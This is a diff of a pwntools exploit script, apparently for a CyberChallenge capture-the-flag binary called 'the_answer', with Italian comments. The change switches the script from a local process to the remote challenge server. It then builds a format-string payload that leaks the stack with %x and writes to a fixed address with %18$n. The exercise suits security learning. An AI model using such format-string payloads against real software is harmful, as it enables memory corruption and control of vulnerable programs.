@@ -11,9 +11,9 @@ def main():
     '''
     HOST = "answer.challs.cyberchallenge.it"
     PORT = 9122
-    #r = remote(HOST, PORT)
-    exe = ELF("./the_answer")
-    r = process(exe.path)
+    r = remote(HOST, PORT)
+    #exe = ELF("./the_answer")
+    #r = process(exe.path)
 
 
     # .send() può essere invocato sull'oggetto ritornato da remote() per inviare dati
@@ -29,14 +29,17 @@ def main():
     # .recvuntil() legge dalla socket finchè non viene incontrata la stringa "something"
 
     answer_address = p64(0x601078, endianness='little')
-    string = "a" * 3
+    string = "s" * 42
     string_bytes = str.encode(string)
-    payload = answer_address + string_bytes + b"%x %x %x %x"
-    tmp = "address" + " %x %x %x %x"
+    payload = answer_address + string_bytes + b" %x %x %x %x %x %x %x %x %x %x %x %x"
+    payload = string_bytes + b"%18$naaaaaaaaaaaaaaaaa" + answer_address
     print(type(payload))
     print(payload)
     data = r.recv(1024)
     r.sendline(payload)
+
+    data = r.recv(1024)
+    print(data)
 
     data = r.recv(1024)
     print(data)
